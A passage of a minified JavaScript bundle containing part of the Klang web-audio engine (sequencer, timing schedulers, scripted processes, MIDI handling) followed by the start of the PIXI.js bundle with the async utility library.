t=0,e=this._registeredPatterns.length;e>t;t++)this._registeredPatterns[t].pause();return this.trigger("pause"),this},i.prototype.unpause=function(){this._paused=!1,this._scheduleTime=U.now()+this._pauseOffset;for(var t=0,e=this._registeredPatterns.length;e>t;t++)this._registeredPatterns[t].unpause();return this},i.prototype.reschedule=function(){clearTimeout(this._scheduler);var e=this._scheduleTime-t.context.currentTime,i=this.getNoteTime(this._resolution),n=e>this._scheduleAheadTime?e-this._scheduleAheadTime:e-(this._scheduleAheadTime-i),s=(e-e%i)/i/(this._beatLength/this._resolution),o=this._scheduleAheadTime/i/(this._beatLength/this._resolution);this._scheduleTime=t.context.currentTime+n,o>s&&(this._scheduleTime-=i),this._currentStep-=o,(isNaN(this._currentStep)||this._currentStep<0)&&(this._currentStep=0);for(var r=0,a=this._registeredPatterns.length;a>r;r++)this._registeredPatterns[r].deschedule(o);return this.startScheduler(),this},i.prototype.stop=function(){return this._started=!1,clearTimeout(this._scheduler),this._scheduler=null,this._started=!1,R.callbacks&&R.callbacks.stopSequencer&&R.callbacks.stopSequencer({name:this._name}),this},i.prototype.stopAll=function(t){for(var e=[],i=0;i<arguments.length-1;i++)e[i]=arguments[i+1];for(var n=void 0!=t.beat?t.beat:4,s=void 0===t.fadeTime?0:t.fadeTime,o=t.forceFade||!1,r=t.wait||0,a=0,u=this._registeredPatterns.length;u>a;a++)-1==e.indexOf(this._registeredPatterns[a])&&(this._registeredPatterns[a].forceFade=o,this._registeredPatterns[a].stop(n,!0,s,r));return this},i.prototype.restart=function(){return this._currentStep=0,this},i.prototype.registerPattern=function(t){return this._registeredPatterns.push(t),this},i.prototype.unregisterPattern=function(t){var e=this._registeredPatterns.indexOf(t);return this._registeredPatterns.splice(e,1),this},i.prototype.registerSynth=function(t){return-1==this._registeredSynths.indexOf(t)&&this._registeredSynths.push(t),this},i.prototype.unregisterSynth=function(t){var e=this._registeredPatterns.indexOf(t);return this._registeredSynths.splice(e,1),this},i.prototype.sync=function(t,e,i){return this.syncInSteps(t,this.getStepsToNext(this.beatLength*e),i)},i.prototype.syncInSteps=function(t,e,i){this._started||this.start();var n=this.getNoteTime(e)+this._scheduleTime;return i?i.length&&i.push(n):i=[n],this._syncHandler.addSyncCountdown(new z(e,t,i)),this},i.prototype.syncPattern=function(e){for(var i=[],n=0;n<arguments.length-1;n++)i[n]=arguments[n+1];var s,o,r=e.beat||0,a=e.fadeIn||!1,u=e.duration||1,c=void 0==e.absolute?!1:e.absolute,h=void 0!=e.syncType?e.syncType:3,l=e.offset,p=e.wait||0;this._started||(this._currentStep=0,this.start(),s=r=0,o=!0);var _,f=!1;if(h===H.Restart)_=0,f=!0;else if(h===H.Playing){for(var d=0,g=-1,y=0,m=i.length;m>y;y++)1===i[y].state&&i[y].length>d&&(d=i[y].length,g=y);var v=0;g>-1&&(v=i[g].getNextBar(r)),_=v*r,v>0&&p>0&&(_+=p)}else if(h===H.All){for(var d=0,g=-1,y=0,m=this._registeredPatterns.length;m>y;y++)(1===this._registeredPatterns[y].state||2===this._registeredPatterns[y].state)&&this._registeredPatterns[y].length>d&&(d=this._registeredPatterns[y].length,g=y);var b=0;g>-1&&(b=this._currentStep+this.getStepsToNext(r)),_=b}else h===H.Continue&&(_=0,f=o?!0:!1);0!=c?s="number"==typeof c?this.getStepsToNext(this.beatLength*c)+this.beatLength*r:this.beatLength*r:r>0?s=this.getStepsToNext(this.beatLength*r):0==r&&(s=0),p>0&&(s+=p);for(var y=0,m=i.length;m>y;y++)void 0!=l&&(l=this.getNoteTime(l)),i[y].prePlaySchedule(s,_,f,a,u,l);if(o){var T=this._scheduleTime-t.context.currentTime,S=this.getNoteTime(this._resolution),O=T>this._scheduleAheadTime?T-this._scheduleAheadTime:T-(this._scheduleAheadTime-S);this._scheduleTime=t.context.currentTime+O,f?this._currentStep=i[0]._currentStep-this._resolution:this._currentStep=i[0]._currentStep,o=!1}else this._scheduleAheadTime>.5&&this.reschedule();return this},i.prototype.registerBPMSync=function(t){return-1==this._syncedObjects.indexOf(t)&&this._syncedObjects.push(t),this},i.prototype.unregisterBPMSync=function(t){var e=this._syncedObjects.indexOf(t);return-1!=e&&this._syncedObjects.splice(e,1),this},i.prototype.getStepsToNext=function(t){return 0==t?0:t-this._currentStep%t},i.prototype.getNoteTime=function(t){return void 0==t&&(t=1),60/this._bpm*t},i.prototype.getBeatTime=function(t){return this.getNoteTime(this.getStepsToNext(t))+this._scheduleTime},Object.defineProperty(i.prototype,"started",{get:function(){return this._started},enumerable:!0,configurable:!0}),Object.defineProperty(i.prototype,"paused",{get:function(){return this._paused},enumerable:!0,configurable:!0}),Object.defineProperty(i.prototype,"bpm",{get:function(){return this._bpm},set:function(t){this._bpm=t;for(var e=0,i=this._registeredPatterns.length;i>e;e++)"MidiPattern"==this._registeredPatterns[e]._type&&this._registeredPatterns[e].recalculateBPM(this._bpm);for(var e=0,i=this._syncedObjects.length;i>e;e++)this._syncedObjects[e].updateSync(this._bpm)},enumerable:!0,configurable:!0}),Object.defineProperty(i.prototype,"scale",{set:function(t){for(var e=0,i=this._registeredPatterns.length;i>e;e++)"MidiPattern"==this._registeredPatterns[e]._type&&(this._registeredPatterns[e].scale=t)},enumerable:!0,configurable:!0}),Object.defineProperty(i.prototype,"customScale",{set:function(t){for(var e=0,i=this._registeredPatterns.length;i>e;e++)"MidiPattern"==this._registeredPatterns[e]._type&&(this._registeredPatterns[e].customScale=t)},enumerable:!0,configurable:!0}),Object.defineProperty(i.prototype,"transpose",{set:function(t){for(var e=0,i=this._registeredPatterns.length;i>e;e++)"MidiPattern"==this._registeredPatterns[e]._type&&(0===t?this._registeredPatterns[e].resetTranspose():this._registeredPatterns[e].transpose+=t)},enumerable:!0,configurable:!0}),Object.defineProperty(i.prototype,"resolution",{get:function(){return this._resolution},enumerable:!0,configurable:!0}),Object.defineProperty(i.prototype,"barLength",{get:function(){return this._barLength},enumerable:!0,configurable:!0}),Object.defineProperty(i.prototype,"beatLength",{get:function(){return this._beatLength},enumerable:!0,configurable:!0}),Object.defineProperty(i.prototype,"currentStep",{get:function(){return this._currentStep},enumerable:!0,configurable:!0}),Object.defineProperty(i.prototype,"swingFactor",{set:function(t){this._swingFactor=t},enumerable:!0,configurable:!0}),i.prototype.setData=function(t){this._bpm=t.bpm||120,this._barLength=t.measure_length||4,this._beatLength=t.beat_length||1,this._swingFactor=t.swing_factor||0},i}(r);e.Sequencer=Q;var z=function(){function t(t,e,i){this._currentStep=0,this._targetStep=t,this._process=e,this._args=i}return t.prototype.advance=function(t){this._currentStep+=t},t.prototype.performAction=function(){"string"==typeof this._process?new Function("Core","Model","Util","args",this._process)(R,e,U,this._args):this._process.start(this._args)},Object.defineProperty(t.prototype,"finished",{get:function(){return this._currentStep>=this._targetStep},enumerable:!0,configurable:!0}),t}();e.SyncCountdown=z;var K=function(){function t(){this._timers=[]}return t.prototype.addSyncCountdown=function(t){this._timers.push(t)},t.prototype.update=function(t){for(var e=0;e<this._timers.length;e++){var i=this._timers[e];i.advance(t),i.finished&&(i.performAction(),this._timers.splice(e,1),e--)}},t}();e.SyncHandler=K;var W=function(){function e(){this._updateTime=R.settings.timehandler_lookahead,this._callbacks=[]}return e.inst=null,Object.defineProperty(e,"instance",{get:function(){return null==e.inst&&(e.inst=new e),e.inst},enumerable:!0,configurable:!0}),e.prototype.startScheduler=function(){if(this._callbacks.length>0){for(var e=t.context.currentTime,i=e-this._lastTime,n=0;n<this._callbacks.length;n++){var s=this._callbacks[n];s.timePassed+=i,s.timePassed>=s.targetTime&&(s.obj[s.func](),this._callbacks.splice(n,1),n--)}this._lastTime=e;var o=this;this._scheduler=setTimeout(function(){o.startScheduler()},o._updateTime)}else this.stop()},e.prototype.start=function(){this._started=!0,this._lastTime=t.context.currentTime,clearTimeout(this._scheduler),this.startScheduler()},e.prototype.stop=function(){this._started=!1,clearTimeout(this._scheduler),this._scheduler=null},e.prototype.registerMethodCallback=function(t,e,i){return this._callbacks.push({obj:t,func:e,timePassed:0,targetTime:i}),this._started||this.start(),this},e.prototype.removeMethodCallback=function(t,e){for(var i=0,n=this._callbacks.length;n>i;i++){var s=this._callbacks[i];if(s.obj==t&&s.func==e)return void this._callbacks.splice(i,1);
}return this},e}();e.TimeHandler=W;var Y=function(){function e(){this._updateTime=100,this._lookAHead=2*this._updateTime,this._callbacks=[]}return e.prototype.scheduleClose=function(e){var i=e.targetTime-t.context.currentTime;setTimeout(function(){e.func.apply(e.ctx)},1e3*i)},e.prototype.runScheduler=function(){if(this._callbacks.length>0){for(var e=t.context.currentTime,i=0;i<this._callbacks.length;i++){var n=this._callbacks[i];e+this._lookAHead>=n.targetTime&&(this.scheduleClose(n),this._callbacks.splice(i,1),i--)}this._lastTime=e;var s=this;this._scheduler=setTimeout(function(){s.runScheduler()},s._updateTime)}else this.stop()},e.prototype.start=function(){this._started=!0,this._lastTime=t.context.currentTime,clearTimeout(this._scheduler),this.runScheduler()},e.prototype.stop=function(){this._started=!1,clearTimeout(this._scheduler),this._scheduler=null},e.prototype.delay=function(e,i,n){return this.at(t.context.currentTime+e,i,n)},e.prototype.at=function(e,i,n){return e<t.context.currentTime?this:(this._callbacks.push({ctx:n||this,func:i,targetTime:e}),this._started||this.start(),this)},e.prototype.cancel=function(t){for(var e=0;e<this._callbacks.length;e++)if(this._callbacks[e].func&&this._callbacks[e].func===t){this._callbacks.splice(e,1);break}return this},e}();e.Scheduler=Y;var X=function(){function i(t){this._vars=t.vars,R.instance.pushToPreLoadInitStack(this)}return i.prototype.init=function(){for(var t=0,e=this._vars.length;e>t;t++){var i=this._vars[t];this._destination=this._actionData[i]=R.instance.findInstance(i)}this._vars=null},i.prototype.start=function(e){t.warn("Process: Invocation of abstract method")},i.prototype.destination=function(){return this._destination},i.prototype.execute=function(t,i,n){return(!this._func||n)&&(this._func=new Function("Core","Model","Util","me","args",t)),this._func(R,e,U,this._actionData,i)},i}();e.Process=X;var J=function(e){function i(t,i){e.call(this,t),this._name=i,this._type=t.type,this._action=t.action,this._actionData={}}return s(i,e),i.prototype.start=function(e){try{this.execute(this._action,e)}catch(i){t.err("Klang: error in process '"+this._name+"': "+i.name+": "+i.message)}},i.prototype.setData=function(t){this._action=t.action,this._vars=t.vars,this.init(),this._func=new Function("Core","Model","Util","me","args",this._action)},i}(X);e.SimpleProcess=J;var $=function(e){function i(i,n){if(e.call(this,i),this._nextStartTime=0,this._waitOffset=0,this.SCHEDULE_AHEAD_TIME=.2,this._lastTime=0,this._name=n,this._type=i.type,this._preAction=i.pre_action||null,this._actions=i.actions,this._currentAction=0,this._started=!1,this._loop=void 0!=i.loop?i.loop:!1,this._loopTime=i.loopTime||-1,this._actionData={process:this},this._loop){for(var s=!1,o=0,r=this._actions.length;r>o;o++)if("wait"==this._actions[o].operation){s=!0;break}s||t.warn("Process: Infinite loop found in process '"+this._name+"'")}}return s(i,e),i.prototype.start=function(e){if(!t.isIOS)try{if(this._args=e,this._currentAction=0,this._execTime=0,this._startTime=t.context.currentTime,this._nextStartTime=this._startTime,this._preAction)if("exec"==this._preAction.operation)this.execute(this._preAction.script,this._args);else if("wait"==this._preAction.operation)return this._execTime=this.execute(this._preAction.script,this._args),this._waitOffset+=this._execTime,void(this._execTime>=this.SCHEDULE_AHEAD_TIME?W.instance.registerMethodCallback(this,"cont",this._execTime-this.SCHEDULE_AHEAD_TIME/2):this.cont());this._started=!0,this.cont()}catch(i){t.err("Klang: error in process '"+this._name+"': "+i.name+": "+i.message)}},i.prototype.cont=function(){this._actionData.execTime=this._nextStartTime+this._waitOffset;for(var t=this._actions.length;this._currentAction<t;this._currentAction++){if(!this._started)return;var e=this._actions[this._currentAction];if("exec"==e.operation)this.execute(e.script,this._args,!0),this._execTime=0;else if("wait"==e.operation)return this._execTime=this.execute(e.script,this._args,!0),this._waitOffset+=this._execTime,this._execTime>=this.SCHEDULE_AHEAD_TIME?W.instance.registerMethodCallback(this,"cont",this._execTime-this.SCHEDULE_AHEAD_TIME/2):this._waitOffset>this.SCHEDULE_AHEAD_TIME?this.scheduleLoop(this._waitOffset):(this._currentAction++,this.cont()),void this._currentAction++}this._loop&&(this._loopTime>0?this.scheduleLoop(this._loopTime):(this._waitOffset=0,this._currentAction=0,this.cont()))},i.prototype.scheduleLoop=function(e){if(this._started){this._nextStartTime+=e;var i=this._nextStartTime-t.context.currentTime,n=this;setTimeout(function(){n._waitOffset=0,n._currentAction=0,n.cont()},1e3*(i-this.SCHEDULE_AHEAD_TIME/2))}},i.prototype.stop=function(){this._started=!1,W.instance.removeMethodCallback(this,"cont")},Object.defineProperty(i.prototype,"started",{get:function(){return this._started},enumerable:!0,configurable:!0}),i.prototype.setData=function(t){this._actions=t.actions,this._vars=t.vars,this.init()},i}(X);e.AdvancedProcess=$}(B||(B={}));var U;!function(e){function i(e,i,n){e.setValueAtTime(i,n||t.context.currentTime)}function n(e,i,n){e.setValueAtTime(e.value+i,n||t.context.currentTime)}function s(e,i,n,s,o){s=s||t.context.currentTime;var r=e.value;void 0!=o&&"Firefox"==t.detector.browser.name&&(r=o),e.setValueAtTime(r,s),e.linearRampToValueAtTime(i,t.context.currentTime+n)}function o(i,n,s,o,r){o=o||t.context.currentTime;var a=i.value;void 0!=r&&"Firefox"==t.detector.browser.name&&(a=r),i.setValueAtTime(0==a?e.EXP_MIN_VALUE:a,o),i.exponentialRampToValueAtTime(n,t.context.currentTime+s)}function r(i,n,s,o){o=o||t.context.currentTime,i.setValueCurveAtTime(e.CUSTOM_CURVES[n],o,s)}function a(i){for(var n in i){var s=i[n];if(s instanceof Array)for(var o=new Float32Array(s.length),r=0,a=s.length;a>r;r++)o[r]=s[r];else{s.curve_type||t.warn("Modulation: Curve type not specified"),s.resolution||(s.resolution=1024),s.amplitude||(s.amplitude=1),s.amplitude_offset||(s.amplitude_offset=0),s.phase_offset||(s.phase_offset=0),s.length||(s.length=1);var o=new Float32Array(s.resolution);if("sine"==s.curve_type)for(var u=s.phase_offset*Math.PI*2,c=s.length*Math.PI*2,r=0,a=o.length;a>r;r++)o[r]=s.amplitude_offset+Math.sin(u+r/a*c)*s.amplitude;else if("saw"==s.curve_type)for(var r=0,a=o.length;a>r;r++)o[r]=s.amplitude_offset+(a-r)/a*s.amplitude;else if("inverse-saw"==s.curve_type)for(var r=0,a=o.length;a>r;r++)o[r]=s.amplitude_offset+r/a*s.amplitude;else t.warn("Modulation: Unrecognized curve type");e.CUSTOM_CURVES[n]=o}}}function u(t,e){return Math.floor(e+(1+t-e)*Math.random())}function c(t,e){return e+(t-e)*Math.random()}function h(t,e,i){return"undefined"==typeof i&&(i=3),t-(t-e)/i}function l(){return"webaudio"==t.version?t.context.currentTime:0}function p(t){return 440*Math.pow(2,(t-69)/12)}function _(t){return 69+12*Math.log(t/440)/Math.log(2)}function f(t){return void 0==t?"lowpass":t}function d(){return/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)}function g(){return/(iPad|iPhone|iPod)/g.test(navigator.userAgent)}function y(t){R.instance.blurFadeOut=t}function m(t){t=t.replace(/[\[]/,"\\[").replace(/[\]]/,"\\]");var e=new RegExp("[\\?&]"+t+"=([^&#]*)"),i=e.exec(location.search);return null==i?"":decodeURIComponent(i[1].replace(/\+/g," "))}function v(t,i,n,s,o){var n=n||120,o=o||2,t=t,i=i;if(i&&t!==i){if(Array.isArray(t)){for(var r,a=0;a<t.length;a++)if(t[a].playing){r=t[a];break}t=r}if(!t)return void i.play(e.now(),0,!1);var u=60/n,c=n/60,h=t?t.position:0;h=h||0;var l=h*c,s=s||4,p=s-l%s;.5>p&&(p+=s);var _=p*u;t.playing||(_=0);var f=e.now()+_;i.play(f,0,!1),!isFinite(f),t&&t.fadeOutAndStop(o,f-1)}}function b(){for(var t=[],e=0;e<arguments.length-0;e++)t[e]=arguments[e+0];for(var i=[{beat:0,fadeOut:2}],n=t.length-1;n>=0;n--){var s=R.instance.findInstance(t[n]);"Pattern"==s.type&&i.push(t[n])}var o=R.instance._objectTable;for(var r in R.instance._objectTable){var a=o[r];"AudioSource"==a._type&&-1==t.indexOf(r)?a.loop&&a.playing&&a.fadeOutAndStop(1):"Sequencer"==a._type?a.stopAll.apply(a,i):"AdvancedProcess"==a._type&&a.started&&-1==t.indexOf(r)&&a.stop()}}function T(t){for(var e,i,n=t.length;n--;)i=Math.random()*n|0,e=t[n],t[n]=t[i],t[i]=e;return t}function S(t){if(0==t)return 0;var e=20,i=2e4;0==e&&(e=.01);var n=t,s=e,o=i,r=Math.log(s),a=Math.log(o),u=(a-r)/(o-s);return Math.exp(r+u*(n-s))}function O(t){for(var e="";e.length<t;)e+="0";return(e+(Math.random()*Math.pow(36,t)<<0).toString(36)).slice(-t)}if(e.setParam=i,e.adjustParam=n,e.curveParamLin=s,e.curveParamExp=o,e.curveParam=r,e.CUSTOM_CURVES={},e.createCurves=a,-1!=navigator.userAgent.indexOf("MSIE")){var P,A=navigator.userAgent,w=new RegExp("MSIE ([0-9]{1,}[.0-9]{0,})");null!=w.exec(A)&&(P=parseInt(RegExp.$1)),9>P&&(Object.defineProperty=Object.oldDefineProperty,delete Object.oldDefineProperty)}e.ROOT12=1.059463094359295,e.NYQUIST_FREQUENCY=22050,e.PITCH_SHIFT_FFT=2048,e.EXP_MIN_VALUE=1e-4,e.OSC_START_DELAY=.005,e.LOG_TIME_COLOR="#999999",e.LOG_EVENT_COLOR="#54CBDD",e.LOG_UNIMPLEMENTED_EVENT_COLOR="#E075A9",e.LOG_LOAD_COLOR="#333333",e.LOG_WARN_COLOR="DarkOrange",e.LOG_ERROR_COLOR="Red",e.lastEvent=void 0,e.vars={},e.random=u,e.randomFloat=c,e.ease=h,e.now=l,e.midiNoteToFrequency=p,e.frequencyToMidiNote=_,e.safeFilterType=f,e.checkMobile=d,e.checkIOS=g,e.setBlurFadeOut=y,e.getParameterByName=m,e.transition=v,e.stopPlayingExcept=b,e.shuffle=T,e.logFreq=S,e.generateIdString=O,e.MidiHandler={midiAccess:null,midiIn:null,midiOut:null,inputs:[],outputs:[],init:function(t){this.MIDIUtils.initUtils();var e=this;window.navigator.requestMIDIAccess().then(function(i){e.onMIDIStarted(i),t&&t()},this.onMIDISystemError)},onMIDISystemError:function(t){console.log("Error encountered:",t)},onMIDIStarted:function(t){e.MidiHandler.midiAccess=t;var i=t.inputs;i.forEach(function(t){e.MidiHandler.inputs.push(t)});var n=t.outputs;return n.forEach(function(t){e.MidiHandler.outputs.push(t)}),e.MidiHandler.inputs.length?(e.MidiHandler.midiIn=e.MidiHandler.inputs[0],e.MidiHandler.midiIn.onmidimessage=e.MidiHandler.midiMessageReceived,e.MidiHandler.midiOut=e.MidiHandler.outputs[0],void 0):void console.error("No midi inputs found")},midiMessageReceived:function(t){var i=t.data[0],n=t.data[0]>>4,s=15&t.data[0],o=t.data[1],r=t.data[2];e.MidiHandler.handleMidiData(i,n,s,o,r)},handleMidiData:function(t,e,i,n,s){},changeMidi:function(t){this.midiOut=this.outputs[t],this.midiIn=this.inputs[t]},MIDIUtils:{noteMap:{},noteNumberMap:[],notes:["C","C#","D","D#","E","F","F#","G","G#","A","A#","B"],initUtils:function(t){for(var e=0;127>e;e++){var i=e,n=this.notes[i%12],s=(i/12|0)-1;1===n.length&&(n+="-"),n+=s,this.noteMap[n]=e,this.noteNumberMap[e]=n}},getBaseLog:function(t,e){return Math.log(t)/Math.log(e)},noteNameToNoteNumber:function(t){return this.noteMap[t]},noteNumberToFrequency:function(t){return 440*Math.pow(2,(t-69)/12)},noteNumberToName:function(t){return this.noteNumberMap[t]},frequencyToNoteNumber:function(t){return Math.round(12*this.getBaseLog(t/440,2)+69)}},play:function(t,e,i){"undefined"==typeof i&&(i=100),this.midiOut.send([144,t,i]),console.log("On"),this.midiOut.send([128,t,0],window.performance.now()+e)},panic:function(){for(var t=1;128>t;++t)this.midiOut.send([128,t,0])}}}(U||(U={}))}(n||(n={})),n});
},{}],125:[function(require,module,exports){
(function (global){
!function(t){if("object"==typeof exports&&"undefined"!=typeof module)module.exports=t();else if("function"==typeof define&&define.amd)define([],t);else{var e;e="undefined"!=typeof window?window:"undefined"!=typeof global?global:"undefined"!=typeof self?self:this,e.PIXI=t()}}(function(){var t;return function e(t,r,i){function n(s,a){if(!r[s]){if(!t[s]){var h="function"==typeof require&&require;if(!a&&h)return h(s,!0);if(o)return o(s,!0);var l=new Error("Cannot find module '"+s+"'");throw l.code="MODULE_NOT_FOUND",l}var u=r[s]={exports:{}};t[s][0].call(u.exports,function(e){var r=t[s][1][e];return n(r?r:e)},u,u.exports,e,t,r,i)}return r[s].exports}for(var o="function"==typeof require&&require,s=0;s<i.length;s++)n(i[s]);return n}({1:[function(t,e,r){(function(r){t("./polyfill");var i=e.exports=t("./core");i.extras=t("./extras"),i.filters=t("./filters"),i.interaction=t("./interaction"),i.loaders=t("./loaders"),i.mesh=t("./mesh"),i.loader=new i.loaders.Loader,Object.assign(i,t("./deprecation")),r.PIXI=i}).call(this,"undefined"!=typeof global?global:"undefined"!=typeof self?self:"undefined"!=typeof window?window:{})},{"./core":29,"./deprecation":78,"./extras":85,"./filters":102,"./interaction":117,"./loaders":120,"./mesh":126,"./polyfill":130}],2:[function(e,r,i){(function(e){!function(){function i(t){var e=!1;return function(){if(e)throw new Error("Callback was already called.");e=!0,t.apply(n,arguments)}}var n,o,s={};n=this,null!=n&&(o=n.async),s.noConflict=function(){return n.async=o,s};var a=Object.prototype.toString,h=Array.isArray||function(t){return"[object Array]"===a.call(t)},l=function(t,e){if(t.forEach)return t.forEach(e);for(var r=0;r<t.length;r+=1)e(t[r],r,t)},u=function(t,e){if(t.map)return t.map(e);var r=[];return l(t,function(t,i,n){r.push(e(t,i,n))}),r},c=function(t,e,r){return t.reduce?t.reduce(e,r):(l(t,function(t,i,n){r=e(r,t,i,n)}),r)},p=function(t){if(Object.keys)return Object.keys(t);var e=[];for(var r in t)t.hasOwnProperty(r)&&e.push(r);return e};"undefined"!=typeof e&&e.nextTick?(s.nextTick=e.nextTick,s.setImmediate="undefined"!=typeof setImmediate?function(t){setImmediate(t)}:s.nextTick):"function"==typeof setImmediate?(s.nextTick=function(t){setImmediate(t)},s.setImmediate=s.nextTick):(s.nextTick=function(t){setTimeout(t,0)},s.setImmediate=s.nextTick),s.each=function(t,e,r){function n(e){e?(r(e),r=function(){}):(o+=1,o>=t.length&&r())}if(r=r||function(){},!t.length)return r();var o=0;l(t,function(t){e(t,i(n))})},s.forEach=s.each,s.eachSeries=function(t,e,r){if(r=r||function(){},!t.length)return r();var i=0,n=function(){e(t[i],function(e){e?(r(e),r=function(){}):(i+=1,i>=t.length?r():n())})};n()},s.forEachSeries=s.eachSeries,s.eachLimit=function(t,e,r,i){var n=d(e);n.apply(null,[t,r,i])},s.forEachLimit=s.eachLimit;var d=function(t){return function(e,r,i){if(i=i||function(){},!e.length||0>=t)return i();var n=0,o=0,s=0;!function a(){if(n>=e.length)return i();for(;t>s&&o<e.length;)o+=1,s+=1,r(e[o-1],function(t){t?(i(t),i=function(){}):(n+=1,s-=1,n>=e.length?i():a())})}()}},f=function(t){return function(){var e=Array.prototype.slice.call(arguments);return t.apply(null,[s.each].concat(e))}},v=function(t,e){return function(){var r=Array.prototype.slice.call(arguments);return e.apply(null,[d(t)].concat(r))}},g=function(t){return function(){var e=Array.prototype.slice.call(arguments);return t.apply(null,[s.eachSeries].concat(e))}},m=function(t,e,r,i){if(e=u(e,function(t,e){return{index:e,value:t}}),i){var n=[];t(e,function(t,e){r(t.value,function(r,i){n[t.index]=i,e(r)})},function(t){i(t,n)})}else t(e,function(t,e){r(t.value,function(t){e(t)})})};s.map=f(m),s.mapSeries=g(m),s.mapLimit=function(t,e,r,i){return y(e)(t,r,i)};var y=function(t){return v(t,m)};s.reduce=function(t,e,r,i){s.eachSeries(t,function(t,i){r(e,t,function(t,r){e=r,i(t)})},function(t){i(t,e)})},s.inject=s.reduce,s.foldl=s.reduce,s.reduceRight=function(t,e,r,i){var n=u(t,function(t){return t}).reverse();s.reduce(n,e,r,i)},s.foldr=s.reduceRight;var x=function(t,e,r,i){var n=[];e=u(e,function(t,e){return{index:e,value:t}}),t(e,function(t,e){r(t.value,function(r){r&&n.push(t),e()})},function(t){i(u(n.sort(function(t,e){return t.index-e.index}),function(t){return t.value}))})};s.filter=f(x),s.filterSeries=g(x),s.select=s.filter,s.selectSeries=s.filterSeries;var b=function(t,e,r,i){var n=[];e=u(e,function(t,e){return{index:e,value:t}}),t(e,function(t,e){r(t.value,function(r){r||n.push(t),e()})},function(t){i(u(n.sort(function(t,e){return t.index-e.index}),function(t){return t.value}))})};s.reject=f(b),s.rejectSeries=g(b);var _=function(t,e,r,i){t(e,function(t,e){r(t,function(r){r?(i(t),i=function(){}):e()})},function(t){i()})};s.detect=f(_),s.detectSeries=g(_),s.some=function(t,e,r){s.each(t,function(t,i){e(t,function(t){t&&(r(!0),r=function(){}),i()})},function(t){r(!1)})},s.any=s.some,s.every=function(t,e,r){s.each(t,function(t,i){e(t,function(t){t||(r(!1),r=function(){}),i()})},function(t){r(!0)})},s.all=s.every,s.sortBy=function(t,e,r){s.map(t,function(t,r){e(t,function(e,i){e?r(e):r(null,{value:t,criteria:i})})},function(t,e){if(t)return r(t);var i=function(t,e){var r=t.criteria,i=e.criteria;return i>r?-1:r>i?1:0};r(null,u(e.sort(i),function(t){return t.value}))})},s.auto=function(t,e){e=e||function(){};var r=p(t),i=r.length;if(!i)return e();var n={},o=[],a=function(t){o.unshift(t)},u=function(t){for(var e=0;e<o.length;e+=1)if(o[e]===t)return void o.splice(e,1)},d=function(){i--,l(o.slice(0),function(t){t()})};a(function(){if(!i){var t=e;e=function(){},t(null,n)}}),l(r,function(r){var i=h(t[r])?t[r]:[t[r]],o=function(t){var i=Array.prototype.slice.call(arguments,1);if(i.length<=1&&(i=i[0]),t){var o={};l(p(n),function(t){o[t]=n[t]}),o[r]=i,e(t,o),e=function(){}}else n[r]=i,s.setImmediate(d)},f=i.slice(0,Math.abs(i.length-1))||[],v=function(){return c(f,function(t,e){return t&&n.hasOwnProperty(e)},!0)&&!n.hasOwnProperty(r)};if(v())i[i.length-1](o,n);else{var g=function(){v()&&(u(g),i[i.length-1](o,n))};a(g)}})},s.retry=function(t,e,r){var i=5,n=[];"function"==typeof t&&(r=e,e=t,t=i),t=parseInt(t,10)||i;var o=function(i,o){for(var a=function(t,e){return function(r){t(function(t,i){r(!t||e,{err:t,result:i})},o)}};t;)n.push(a(e,!(t-=1)));s.series(n,function(t,e){e=e[e.length-1],(i||r)(e.err,e.result)})};return r?o():o},s.waterfall=function(t,e){if(e=e||function(){},!h(t)){var r=new Error("First argument to waterfall must be an array of functions");return e(r)}if(!t.length)return e();var i=function(t){return function(r){if(r)e.apply(null,arguments),e=function(){};else{var n=Array.prototype.slice.call(arguments,1),o=t.next();n.push(o?i(o):e),s.setImmediate(function(){t.apply(null,n)})}}};i(s.iterator(t))()};var T=function(t,e,r){if(r=r||function(){},h(e))t.map(e,function(t,e){t&&t(function(t){var r=Array.prototype.slice.call(arguments,1);r.length<=1&&(r=r[0]),e.call(null,t,r)})},r);else{var i={};t.each(p(e),function(t,r){e[t](function(e){var n=Array.prototype.slice.call(arguments,1);n.length<=1&&(n=n[0]),i[t]=n,r(e)})},function(t){r(t,i)})}};s.parallel=function(t,e){T({map:s.map,each:s.each},t,e)},s.parallelLimit=function(t,e,r){T({map:y(e),each:d(e)},t,r)},s.series=function(t,e){if(e=e||function(){},h(t))s.mapSeries(t,function(t,e){t&&t(function(t){var r=Array.prototype.slice.call(arguments,1);r.length<=1&&(r=r[0]),e.call(null,t,r)})},e);else{var r={};s.eachSeries(p(t),function(e,i){t[e](function(t){var n=Array.prototype.slice.call(arguments,1);n.length<=1&&(n=n[0]),r[e]=n,i(t)})},function(t){e(t,r)})}},s.iterator=function(t){var e=function(r){var i=function(){return t.length&&t[r].apply(null,arguments),i.next()};return i.next=function(){return r<t.length-1?e(r+1):null},i};return e(0)},s.apply=function(t){var e=Array.prototype.slice.call(arguments,1);return function(){return t.apply(null,e.concat(Array.prototype.slice.call(arguments)))}};var E=function(t,e,r,i){var n=[];t(e,function(t,e){r(t,function(t,r){n=n.concat(r||[]),e(t)})},function(t){i(t,n)})};s.concat=f(E),s.concatSeries=g(E),s.whilst=function(t,e,r){t()?e(function(i){return i?r(i):void s.whilst(t,e,r)}):r()},s.doWhilst=function(t,e,r){t(function(i){if(i)return r(i);var n=Array.prototype.slice.call(arguments,1);e.apply(null,n)?s.doWhilst(t,e,r):r()})},s.until=function(t,e,r){t()?r():e(function(i){return i?r(i):void s.until(t,e,r)})},s.doUntil=function(t,e,r){t(function(i){if(i)return r(i);var n=Array.prototype.slice.call(arguments,1);e.apply(null,n)?r():s.doUntil(t,e,r)})},s.queue=function(t,e){function r(t,e,r,i){return t.started||(t.started=!0),h(e)||(e=[e]),0==e.length?s.setImmediate(function(){t.drain&&t.drain()}):void l(e,function(e){var n={data:e,callback:"function"==typeof i?i:null};r?t.tasks.unshift(n):t.tasks.push(n),t.saturated&&t.tasks.length===t.concurrency&&t.saturated(),s.setImmediate(t.process)})}void 0===e&&(e=1);var n=0,o={tasks:[],concurrency:e,saturated:null,empty:null,drain:null,started:!1,paused:!1,push:function(t,e){r(o,t,!1,e)},kill:function(){o.drain=null,o.tasks=[]},unshift:function(t,e){r(o,t,!0,e)},process:function(){if(!o.paused&&n<o.concurrency&&o.tasks.length){var e=o.tasks.shift();o.empty&&0===o.tasks.length&&o.empty(),n+=1;var 